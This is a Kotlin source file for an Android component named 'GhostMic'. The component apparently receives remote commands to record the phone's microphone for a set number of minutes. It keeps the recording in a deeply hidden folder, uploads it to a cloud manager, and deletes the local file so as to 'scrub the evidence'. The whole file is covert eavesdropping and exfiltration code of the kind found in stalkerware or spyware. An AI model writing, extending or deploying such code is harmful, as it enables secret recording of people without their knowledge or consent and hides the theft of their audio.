package com.example.myandroid

import android.content.Context
import android.media.MediaRecorder
import kotlinx.coroutines.*
import java.io.File

object GhostMic {
    private var recorder: MediaRecorder? = null
    private var isRecording = false

    suspend fun recordAudio(ctx: Context, durationMins: Long) = withContext(Dispatchers.IO) {
        if (isRecording) {
            DebugLogger.log("MIC", "Already recording, ignoring duplicate command.")
            return@withContext
        }
        if (!PermissionManager.hasMicrophoneAccess(ctx)) {
            DebugLogger.log("MIC", "No microphone permission.")
            return@withContext
        }

        var outputFile: File? = null
        try {
            isRecording = true
            // Request a direct file path deep in the 9-level catacombs
            outputFile = DumpManager.getNewOfflineMediaFile("audio_capture", "mp4")
            if (outputFile == null) return@withContext

            // Safely initialize recorder based on OS version
            recorder = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                MediaRecorder(ctx)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(64000) // Lower bitrate to save space
                setOutputFile(outputFile.absolutePath)
                prepare()
                start()
            }

            DebugLogger.log("MIC", "Hot mic engaged for $durationMins minutes.")

            // Suspend coroutine without blocking thread
            delay(durationMins * 60 * 1000L)

        } catch (e: Throwable) {
            DebugLogger.log("MIC_ERR", "GhostMic fatal crash: ${e.message}")
        } finally {
            safeTeardown()
            isRecording = false

            // Attempt to upload instantly. If offline or it fails, the file stays in the catacombs.
            // SyncWorker explicitly sweeps for `.mp4` files, so it will rescue it later.
            outputFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            if (CloudManager.uploadFile(ctx, file, "AUDIO")) {
                                file.delete() // Successfully uploaded, scrub the evidence
                            }
                        } catch (e: Throwable) {}
                    }
                } else {
                    file.delete() // File was corrupt or empty, kill it
                }
            }
        }
    }

    private fun safeTeardown() {
        try { recorder?.stop() } catch (e: Throwable) {}
        try { recorder?.release() } catch (e: Throwable) {}
        recorder = null
    }
}

